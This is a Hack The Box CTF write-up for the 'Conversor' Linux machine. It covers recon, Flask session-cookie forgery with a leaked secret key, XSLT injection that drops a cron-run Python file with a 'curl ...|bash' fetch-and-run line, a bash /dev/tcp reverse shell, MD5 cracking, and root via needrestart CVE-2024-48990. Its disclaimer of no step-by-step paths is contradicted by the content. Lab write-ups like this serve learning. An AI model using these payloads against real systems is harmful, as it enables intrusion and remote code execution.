@@ -1,0 +1,252 @@
+---
+title : Conversor
+description: "A guide to ctf challenge Conversor on Hack The Box."
+pubDate: 2026-01-27
+heroImage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/0b659c391f2803c247e79c77a3284f96.png?size=small&format=webp"
+author: "Koustubh Badshah"
+tags: ['htb', 'writeup', 'ctf', 'linux', 'writeup']
+---
+
+# Conversor 
+
+## ⚠️ Disclaimer
+
+<div style=" color: red;">
+The content published in this write-up is intended **strictly for educational and learning purposes**. 
+This post discusses concepts, methodologies, and high-level approaches related to **Hack The Box machine** and **does not include full solutions, flags, credentials, or step-by-step exploitation paths**.
+
+No sensitive information is disclosed that would compromise the integrity of active machines or violate Hack The Box’s rules. All analysis is based on publicly allowed practices and personal learning experiences.
+
+Readers are strongly encouraged to:
+- Follow **Hack The Box’s Code of Conduct**
+- Attempt the machines **independently**
+- Use this content only to **understand techniques**, not to shortcut challenges
+
+The author takes **no responsibility for misuse** of the information provided. Any testing or exploitation discussed should be performed **only in legal, authorized environments**.
+By engaging with this content, you agree to use it ethically and responsibly.
+
+</div>
+
+## Introduction
+
+This is an easy linux machine from ***Hack the box*** made public on 25<sup>th</sup> October 2025. It focus on web exploitation, Session Cookie Forgery,
+XSLT code injection, and needrestart vulnerability for gainig root access.
+
+### Reconnaissance
+
+As always, I start with an nmap scan to identify open ports and services running on the target machine.
+
+```bash
+$ nmap -sC -sV -sS -A -O -sU <IP_ADDRESS>
+```
+
+The scan reveals the following open ports and services:
+
+```
+PORT   STATE         SERVICE VERSION
+22/tcp open          ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
+|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
+80/tcp open          http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://conversor.htb/
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+68/udp open|filtered dhcpc
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19
+Network Distance: 2 hops
+Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+As usual, I added the domain to our /etc/hosts file.
+
+```bash
+$ echo "<IP_ADDRESS> conversor.htb" | sudo tee -a /etc/hosts
+```
+
+Next , I used gobuster to enumerate directories on the web server.
+
+```bash
+$ gobuster dir -w <path-to-wordlists> -u conversor.htb
+```
+
+The scan revealed the following directories:
+```
+/about                (Status: 200) [Size: 2842]
+/javascript           (Status: 301) [Size: 319] [--> http://conversor.htb/javascript/]
+/login                (Status: 200) [Size: 722]
+/logout               (Status: 302) [Size: 199] [--> /login]
+/register             (Status: 200) [Size: 726]
+/server-status        (Status: 403) [Size: 278]
+```
+
+### Enumeration
+
+Navigating to the web application I encounterd a login page and a regestration page. When I went to **/about** page I found a download link
+which downloaded a file named **source_code.tar.gz**. Obviously, it is a source code of the web application. I extracted the tar file and started analyzing the code.
+
+```bash
+$ tar -vzf source_code.tar.gz
+```
+
+On closler inspection of the code, I found that the application is built using Flask framework. In the **app.py** file, I found the following code snippet that handles user authentication:
+
+```python
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = hashlib.md5(request.form['password'].encode()).hexdigest()
+        conn = get_db()
+        cur = conn.cursor()
+        cur.execute("SELECT * FROM users WHERE username=? AND password=?", (username,password))
+        user = cur.fetchone()
+        conn.close()
+        if user:
+            session['user_id'] = user['id']
+            session['username'] = username
+            return redirect(url_for('index'))
+        else:
+            return "Invalid credentials"
+    return render_template('login.html')
+```
+
+From the above code, I noticed that the application uses MD5 hashing for password storage, 
+which is considered weak and vulnerable to collision attacks. This could potentially allow an attacker to exploit the 
+authentication mechanism. Also I found the secret_key used for session management:
+
+```python
+app.secret_key = 'Changemeplease'
+```
+
+### Exploitation
+
+Using the secret key, I crafted a malicious session cookie to bypass authentication.
+I used the following Python script to create a session cookie:
+
+```python
+flask-unsign --sign \
+  --cookie "{'user_id': 1, 'username': 'admin'}" \
+  --secret 'Changemeplease'
+```
+This generated session cookie got me logged in as admin user.
+With admin access, I explored the application further and found a file upload functionality that allowed me to upload files to the server.
+It accepted a ```.xml``` and ```.xslt``` files, on hitting convert button it did the conversion to html file. I analyzed the code handling file uploads and found that it did not properly validate the uploaded files, allowing me to upload a malicious file.
+
+```python
+@app.route('/convert', methods=['POST'])
+def convert():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    xml_file = request.files['xml_file']
+    xslt_file = request.files['xslt_file']
+    from lxml import etree
+    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
+    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
+    xml_file.save(xml_path)
+    xslt_file.save(xslt_path)
+    try:
+        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
+        xml_tree = etree.parse(xml_path, parser)
+        xslt_tree = etree.parse(xslt_path)
+        transform = etree.XSLT(xslt_tree)
+        result_tree = transform(xml_tree)
+        result_html = str(result_tree)
+        file_id = str(uuid.uuid4())
+        filename = f"{file_id}.html"
+        html_path = os.path.join(UPLOAD_FOLDER, filename)
+        with open(html_path, "w") as f:
+            f.write(result_html)
+        conn = get_db()
+        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
+        conn.commit()
+        conn.close()
+        return redirect(url_for('index'))
+    except Exception as e:
+        return f"Error: {e}"
+
+@app.route('/view/<file_id>')
+def view_file(file_id):
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    conn = get_db()
+    cur = conn.cursor()
+    cur.execute("SELECT * FROM files WHERE id=? AND user_id=?", (file_id, session['user_id']))
+    file = cur.fetchone()
+    conn.close()
+    if file:
+        return send_from_directory(UPLOAD_FOLDER, file['filename'])
+    return "File not found"
+```
+
+I made a malicious XSLT file that helped me a RCE:
+```xml
+<xsl:stylesheet
+    version="1.0"
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+    xmlns:shell="http://exslt.org/common"
+    extension-element-prefixes="shell">
+
+    <xsl:template match="/">
+        <shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
+            import os
+            os.system("curl <your-ip>:8000/shell.sh|bash")
+        </shell:document>
+    </xsl:template>
+
+</xsl:stylesheet>
+```
+
+shell.sh
+```
+bash -i >& /dev/tcp/10.10.16.18/1234 0>&1
+```
+
+in a seprate terminal start a python server at location of shell.sh file
+```
+python3 -m http.server
+```
+
+You might have gotten out of zone as you might be new hear analyzing the code I found that a cron job is running in the server which allows 
+us to exploit it to get a reverse shell as it keeps executing the python code I added in interval's.
+Waiting for some I got the shell, I tried to go to **/home/fismathack** but permission was denied then I went to **/instance** where users.db was located
+it accessed it and got a MD5 hash:
+```sql
+sqlite3 users.db
+
+select * from users;
+```
+
+cracking the hash using john
+
+```
+john -w <path-to-wordlist> --format=Raw-MD5 hash.txt 
+```
+Now I can easily ssh to the running machine, it will prompt for password:
+```
+ssh fismathack@<target-ip>
+``` 
+
+Doing ```cat user.txt``` reveals the user flag.
+
+### Privilage Escalation
+
+Firstly I tried to determine if I have root access so I tried ```sudo -l``` and indeed it returened a promissing result 
+***(ALL : ALL) NOPASSWD: /usr/sbin/needrestart*** indicating that the current user does not need any password to execute the needrestart
+binary on further research I found out that this was indeed a vulnerability [CVE-2024-48990](https://github.com/ten-ops/CVE-2024-48990_needrestart).
+So, I cloned the exploit to my local machine as the github was not resolving in target machine.
+
+Following the instructions in the README.md file I successfully created the payloads. Now using same methodology I transfered all the files to the location intended
+in the target machine using ```python3 -m http.server``` and using ***curl*** and started the shell script. Then I SSH in another terminal to the 
+target machine and used ```sudo /usr/sbin/needrestart``` and viola I got the root access I executed ```cd /root | cat root.txt``` and obtained the root flag.
+
+### Cleanup 
+
+After completing the machine don't forget to remove the **/tmp/attacker** from your local machine.
+
+## Conclusion
+
+The machine was good and fair for beginners trying to learn about exploitation techniques, in this machine we exploited the weak authentication mechanism,
+XSLT code injection to get a RCE, then we proceeded with needrestart CVE-2024-48990 to gain root privelage.
